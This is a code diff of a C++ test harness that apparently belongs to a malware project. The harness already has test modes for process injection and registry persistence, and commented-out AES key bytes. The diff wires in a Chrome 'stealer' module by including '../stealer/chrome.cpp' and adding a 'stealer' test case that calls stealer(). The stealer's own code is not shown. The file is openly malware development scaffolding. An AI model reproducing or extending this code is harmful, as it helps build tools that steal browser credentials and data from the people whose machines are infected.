@@ -2,8 +2,10 @@
 #include "aes_gcm.h"
 #include "http.h"
 #include "inject.h"
+#include "../stealer/chrome.cpp"
 #include <iostream>
 #include <fstream>
+
 
 // BYTE textIV[] = {0x87, 0xb8, 0xa9, 0xa6, 0xc2, 0x39, 0x42, 0x5f, 0xc2, 0xda, 0x8c, 0xc1};
 // BYTE key[] = {0x41, 0x13, 0xcd, 0xa3, 0xa0, 0xe0, 0xab, 0x5e, 0x19, 0xf1, 0xc0, 0x1c, 0x6d, 0x4e, 0x77, 0xc5, 0xe5, 0x20, 0xd2, 0x44, 0xe, 0x52, 0xae, 0x87, 0xaa, 0xa, 0x96, 0x67, 0x28, 0x82, 0xea, 0x8};
@@ -147,6 +149,10 @@ void test_persistence()
     RegCloseKey(hKey);
 }
 
+void test_stealer() {
+    stealer();
+}
+
 int main(int argc, char* argv[])
 {   
     if (argc != 2) {
@@ -166,6 +172,8 @@ int main(int argc, char* argv[])
         test_inject();
     } else if (test_name == "persistence") {
         test_persistence();
+    } else if (test_name == "stealer") {
+        test_stealer();
     } else {
         std::cout << "test name invalid" << std::endl;
     }
